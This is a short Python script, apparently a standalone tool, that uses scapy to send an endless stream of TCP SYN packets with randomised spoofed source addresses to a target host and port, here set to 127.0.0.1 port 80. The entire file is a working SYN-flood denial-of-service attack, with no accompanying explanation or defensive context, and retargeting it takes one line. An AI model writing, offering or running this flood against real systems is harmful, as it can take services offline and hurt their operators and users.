from scapy.all import *

target_ip = "127.0.0.1"
target_port = 80

while True:
    ip = IP(src=RandIP(), dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    pkt = ip/tcp
    send(pkt, verbose=False)
    print(f"[SYN] Sent packet to {target_ip}:{target_port}")
